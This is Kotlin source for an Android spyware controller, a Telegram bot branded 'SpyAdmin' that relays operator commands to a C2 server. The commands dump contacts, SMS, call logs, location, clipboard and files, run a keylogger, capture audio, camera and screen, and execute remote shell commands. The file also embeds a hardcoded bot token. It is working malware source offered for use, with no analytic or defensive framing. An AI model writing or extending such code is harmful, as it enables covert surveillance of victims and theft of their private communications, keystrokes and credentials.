package com.system.monitor.admin

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit

class TelegramBotService(private val context: Context) {

    companion object {
        private const val BOT_TOKEN = "9168397709:AAEVVXnjTtxUm76KCfBJENNiQSg-MyqgN4M"
        private const val ALLOWED_USER_ID = 8335972628L
        private const val TELEGRAM_API = "https://api.telegram.org/bot"
        private const val PREFS_NAME = "telegram_bot_config"
        private const val KEY_OFFSET = "update_offset"
    }

    private val gson = Gson()
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private var running = false
    private var pollThread: Thread? = null

    fun start() {
        if (running) return
        running = true
        pollThread = Thread({ pollLoop() }, "telegram-bot-poll")
        pollThread?.start()
        Log.d("TelegramBot", "Bot started")
    }

    fun stop() {
        running = false
        pollThread?.interrupt()
        pollThread = null
        Log.d("TelegramBot", "Bot stopped")
    }

    private fun pollLoop() {
        while (running) {
            try {
                getUpdates()
            } catch (e: Exception) {
                Log.e("TelegramBot", "Poll error", e)
            }
            try {
                Thread.sleep(2000)
            } catch (e: InterruptedException) {
                return
            }
        }
    }

    private fun getUpdates() {
        val offset = prefs.getLong(KEY_OFFSET, 0) + 1
        val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=$offset&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"

        val request = Request.Builder().url(url).build()
        client.newCall(request).execute().use { response ->
            response.body?.string()?.let { json ->
                val result = gson.fromJson(json, TelegramResponse::class.java)
                result.result?.forEach { update ->
                    prefs.edit().putLong(KEY_OFFSET, update.updateId).apply()
                    handleUpdate(update)
                }
            }
        }
    }

    private fun handleUpdate(update: TelegramUpdate) {
        update.message?.let { msg ->
            if (msg.from?.id == ALLOWED_USER_ID) {
                handleCommand(msg)
            } else {
                sendMessage(msg.chat.id, "⛔ Unauthorized. Your ID: ${msg.from?.id}")
            }
        }
        update.callbackQuery?.let { query ->
            if (query.from?.id == ALLOWED_USER_ID) {
                handleCallback(query)
            }
        }
    }

    private fun handleCommand(msg: TelegramMessage) {
        val text = msg.text ?: ""
        val chatId = msg.chat.id

        when {
            text.startsWith("/start") -> {
                sendMessage(chatId, getHelpMessage())
                notifyOnboard(msg.from?.firstName ?: "User")
            }
            text == "/status" -> sendStatus(chatId)
            text == "/agents" -> sendAgentsList(chatId)
            text.startsWith("/task ") -> sendTaskCommand(chatId, text.substring(6))
            text.startsWith("/shell ") -> sendShellCommand(chatId, text.substring(7))
            text == "/screenshot" -> sendTask(chatId, "screen", mapOf("action" to "capture"))
            text == "/location" -> sendTask(chatId, "location", mapOf("action" to "get"))
            text == "/contacts" -> sendTask(chatId, "contacts", mapOf())
            text == "/sms" -> sendTask(chatId, "sms", mapOf())
            text == "/calls" -> sendTask(chatId, "call_logs", mapOf())
            text == "/apps" -> sendTask(chatId, "apps", mapOf("action" to "list"))
            text == "/files" -> sendTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
            text == "/wifi" -> sendTask(chatId, "wifi", mapOf("action" to "scan"))
            text == "/clipboard" -> sendTask(chatId, "clipboard", mapOf("action" to "get"))
            text == "/keylogger_on" -> sendTask(chatId, "keylogger", mapOf("action" to "start"))
            text == "/keylogger_off" -> sendTask(chatId, "keylogger", mapOf("action" to "stop"))
            text == "/keylogger_dump" -> sendTask(chatId, "keylogger", mapOf("action" to "dump"))
            text == "/audio" -> sendTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
            text == "/camera" -> sendTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
            text == "/help" -> sendMessage(chatId, getHelpMessage())
            else -> sendMessage(chatId, "Unknown command. Use /help")
        }
    }

    private fun handleCallback(query: CallbackQuery) {
        // Handle inline keyboard callbacks if needed
    }

    private fun sendTaskCommand(chatId: Long, args: String) {
        // Parse custom task command: /task capability json_args
        val parts = args.split(" ", limit = 2)
        if (parts.size < 2) {
            sendMessage(chatId, "Usage: /task <capability> <json_args>")
            return
        }
        val capability = parts[0]
        val jsonArgs = parts[1]
        try {
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
            val argsMap = gson.fromJson< Map<String, Any>>(jsonArgs, type)
            sendTask(chatId, capability, argsMap)
        } catch (e: Exception) {
            sendMessage(chatId, "Invalid JSON args: ${e.message}")
        }
    }

    private fun sendShellCommand(chatId: Long, command: String) {
        sendTask(chatId, "shell", mapOf("command" to command))
    }

    private fun sendTask(chatId: Long, capability: String, args: Map<String, Any>) {
        val c2Url = getC2Url()
        val payload = mapOf(
            "action" to "task",
            "capability" to capability,
            "args" to gson.toJson(args),
            "timeout" to 30
        )
        sendC2Request(c2Url, "/api/command", payload) { resp ->
            sendMessage(chatId, "✅ Task sent: $capability\nResponse: $resp")
        } ?: run {
            sendMessage(chatId, "❌ Failed to send task (no C2 or agents)")
        }
    }

    private fun sendC2Request(baseUrl: String, endpoint: String, payload: Map<String, Any>, callback: (String) -> Unit): String? {
        try {
            val url = "$baseUrl$endpoint"
            val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { response ->
                val respBody = response.body?.string()
                respBody?.let { callback(it) }
                return respBody
            }
        } catch (e: Exception) {
            Log.e("TelegramBot", "C2 request failed", e)
            return null
        }
        return null
    }

    private fun sendStatus(chatId: Long) {
        val c2Url = getC2Url()
        val payload = mapOf("action" to "list_agents")
        sendC2Request(c2Url, "/api/agents", payload) { resp ->
            sendMessage(chatId, "📊 *Agents Status:*\n$resp")
        } ?: run {
            sendMessage(chatId, "❌ C2 unreachable")
        }
    }

    private fun sendAgentsList(chatId: Long) {
        val c2Url = getC2Url()
        val payload = mapOf("action" to "list_agents")
        sendC2Request(c2Url, "/api/agents", payload) { resp ->
            sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
        } ?: run {
            sendMessage(chatId, "❌ C2 unreachable")
        }
    }

    private fun notifyOnboard(userName: String) {
        val message = "🔔 *New Agent Onboarded*\n" +
            "User: $userName\n" +
            "Device: ${android.os.Build.MODEL}\n" +
            "Android: ${android.os.Build.VERSION.RELEASE}\n" +
            "Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date())}"
        sendMessage(ALLOWED_USER_ID, message)
    }

    private fun getC2Url(): String {
        val adminPrefs = context.getSharedPreferences("admin_config", Context.MODE_PRIVATE)
        return adminPrefs.getString("c2_url", "https://c2.example.com:8443") ?: "https://c2.example.com:8443"
    }

    private fun getHelpMessage(): String {
        return """
🤖 *SpyAdmin Telegram Bot*

*System Commands:*
/start - Show this help & notify admin
/status - Show C2 status
/agents - List connected agents
/help - Show this message

*Surveillance Commands:*
/screenshot - Capture screen
/location - Get GPS location
/contacts - Dump contacts
/sms - Dump SMS messages
/calls - Dump call logs
/apps - List installed apps
/files - List files (/sdcard)
/wifi - Scan WiFi networks
/clipboard - Get clipboard content
/keylogger_on - Start keylogger
/keylogger_off - Stop keylogger
/keylogger_dump - Dump keystrokes
/audio - Record audio (30s)
/camera - Capture photo

*System Commands:*
/shell <cmd> - Execute shell command
/task <capability> <json> - Custom task

*Admin only. Unauthorized users will be rejected.*
        """.trimIndent()
    }

    private fun sendMessage(chatId: Long, text: String) {
        try {
            val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
            val payload = mapOf(
                "chat_id" to chatId,
                "text" to text,
                "parse_mode" to "Markdown"
            )
            val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                response.body?.string()
            }
        } catch (e: Exception) {
            Log.e("TelegramBot", "Send message failed", e)
        }
    }

    // Data classes for Telegram API
    data class TelegramResponse(
        val ok: Boolean,
        val result: List<TelegramUpdate>? = null
    )

    data class TelegramUpdate(
        val updateId: Long,
        val message: TelegramMessage? = null,
        val callbackQuery: CallbackQuery? = null
    )

    data class TelegramMessage(
        val messageId: Long,
        val from: TelegramUser? = null,
        val chat: TelegramChat,
        val text: String? = null,
        val date: Long
    )

    data class TelegramUser(
        val id: Long,
        val firstName: String?,
        val lastName: String?,
        val username: String?
    )

    data class TelegramChat(
        val id: Long,
        val type: String,
        val title: String?
    )

    data class CallbackQuery(
        val id: String,
        val from: TelegramUser,
        val message: TelegramMessage?,
        val data: String?
    )
}